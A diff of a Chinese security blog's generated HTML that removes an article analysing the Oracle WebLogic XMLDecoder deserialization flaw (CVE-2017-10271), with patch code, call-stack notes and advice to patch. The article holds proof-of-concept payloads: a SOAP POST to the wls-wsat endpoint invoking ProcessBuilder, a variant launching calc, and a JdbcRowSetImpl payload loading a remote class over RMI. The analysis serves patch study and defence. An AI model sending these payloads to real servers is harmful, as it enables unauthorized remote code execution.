 <h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p>可以看到调用栈如下：<br><img src="/images/cve-2019-2647-2.png" alt="2"></p>
 
@@ -2031,189 +2215,6 @@ class java.lang.ProcessBuilder</code></p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/23/Weblogic XMLDecoder RCE分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/12/23/Weblogic XMLDecoder RCE分析/" itemprop="url">
-                  Weblogic XMLDecoder RCE分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T08:37:04+08:00">
-                2017-12-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/12/23/Weblogic XMLDecoder RCE分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/12/23/Weblogic XMLDecoder RCE分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/12/23/Weblogic XMLDecoder RCE分析/" class="leancloud_visitors" data-flag-title="Weblogic XMLDecoder RCE分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>挖矿确实太火，现在只要存在RCE漏洞就会有矿机的身影，这不weblogic又火了一把。这次矿机使用的PoC是wls wsat模块的RCE漏洞，这个漏洞的核心就是XMLDecoder的反序列化漏洞，关于XMLDecoder反序列化的漏洞在2013年就被广泛传播，这次的漏洞是由于官方修复不完善导致被绕过。</p>
-<h2 id="1-补丁分析"><a href="#1-补丁分析" class="headerlink" title="1 补丁分析"></a>1 补丁分析</h2><p>首先来看下weblogic的历史补丁，四月份补丁通告：<br><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html</a><br>这里面主要关注CVE-2017-3506，这是web service模块的漏洞。</p>
-<p>10月份补丁通告：<br><a href="https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html" target="_blank" rel="external">https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html</a><br>主要关注CVE-2017-10271，是WLS Security组建的漏洞，英文描述如下：<br>A remote user can exploit a flaw in the Oracle WebLogic Server WLS Security component to gain elevated privileges [CVE-2017-10271].这是CVE-2017-10271的描述信息。<br>测试的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 192.168.3.216:7001</div><div class="line">Accept-Encoding: identity</div><div class="line">Content-Length: 683</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Accept: */*</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</div><div class="line">Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</div><div class="line">Connection: keep-alive</div><div class="line">Cache-Control: max-age=0</div><div class="line">Content-Type: text/xml</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">  &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">              。。。。</div><div class="line">          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">        &lt;/java&gt;</div><div class="line">      &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">  &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
-<p>对于poc中uri中<code>/wls-wsat/CoordinatorPortType</code> 可以换成CoordinatorPortType11等wsat 这个webservice服务中存在的其他uri<br>执行的效果图如下：<br><img src="/images/2017-10271-0.png" alt="0"></p>
-<p>跟踪到底这还是XMLDecoder的漏洞，下面来分析补丁代码：首先来看3506的补丁的分析，在文件weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，<br>添加了validate方法，方法的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">         SAXParser parser = factory.newSAXParser();</div><div class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</div><div class="line">               &#125;</div><div class="line">            &#125;</div><div class="line">         &#125;);</div><div class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</div><div class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</div><div class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</div><div class="line">      &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
-<p>简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。我前段时间分析Oracle Weblogic十月份的补丁的时候看到WorkContextXmlInputAdapter 相关代码时只关注了这块dos的漏洞，没看到10271添加的对new，method，void的去除，还想当然的以为自己找到0day了呢。因为可以通过其他方式绕过，比如典型的就是将object改为void，这是挖矿的人采用的poc，我也想到了，当然也还可以通过new关键字来创建反序列化执行的poc，下面简单示例一下通过new关键字来执行命令：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"start"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">new</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>至于为什么XMLDecoder在解析的过程中能执行代码呢，大家可以以如下测试用例进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;void class=&quot;com.sun.rowset.JdbcRowSetImpl&quot;&gt;</div><div class="line">    &lt;void property=&quot;dataSourceName&quot;&gt;</div><div class="line">        &lt;string&gt;rmi://localhost:1099/Exploit&lt;/string&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;void property=&quot;autoCommit&quot;&gt;</div><div class="line">        &lt;boolean&gt;true&lt;/boolean&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
-<p>是不是觉得变种太多，写法太灵活了，比XStream远程执行代码的要求还低。根据如上poc首先生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口的时候就会根据dataSourceName的值去远程加载一个类初始化。</p>
-<p>针对上面的PoC，官方放出了10271的补丁，补丁如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line"></div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
-<p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。如下的测试用例就不可执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">        &lt;string&gt;calc&lt;/string&gt;&lt;method name=&quot;start&quot; /&gt;</div><div class="line">    &lt;/new&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
-<h2 id="2-动态调试"><a href="#2-动态调试" class="headerlink" title="2 动态调试"></a>2 动态调试</h2><p>为了更好的理解这个漏洞，我们通过本地的weblogic动态调试一番，PoC还是前面提到的，具体的调用栈如下：<br><img src="/images/2017-10271-1.png" alt="1"><br><img src="/images/2017-10271-2.png" alt="2"><br><img src="/images/2017-10271-3.png" alt="3"></p>
-<p>调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> NextAction <span class="title">processRequest</span><span class="params">(Packet var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">false</span>;</div><div class="line">   <span class="keyword">if</span>(var1.getMessage() != <span class="keyword">null</span>) &#123;</div><div class="line">      HeaderList var2 = var1.getMessage().getHeaders();</div><div class="line">      Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var3 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeaderOld(var3);</div><div class="line">         <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">true</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      Header var4 = var2.get(<span class="keyword">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var4 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeader(var4);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      XMLStreamReader var2 = var1.readHeader();</div><div class="line">      var2.nextTag();</div><div class="line">      var2.nextTag();</div><div class="line">      XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</div><div class="line">      ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">      XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</div><div class="line">      var3.bridge(var2, var5);</div><div class="line">      var5.close();</div><div class="line">      WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</div><div class="line">      <span class="keyword">this</span>.receive(var6);</div><div class="line">   &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</div><div class="line">   &#125; <span class="keyword">catch</span> (IOException var8) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在上述代码中ByteArrayOutputStream var4会被填充为PoC实际执行部分代码即：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></div><div class="line">             。。。</div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>接着这部分xml会被传递到XMLDecoder的readObject方法中从而导致反序列化远程代码执行。</p>
-<p>总之，尽快打上Weblogic 10月份的补丁。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2263,7 +2264,7 @@ class java.lang.ProcessBuilder</code></p>
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-count">34</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2284,8 +2285,8 @@ class java.lang.ProcessBuilder</code></p>
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">120</span>
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">123</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
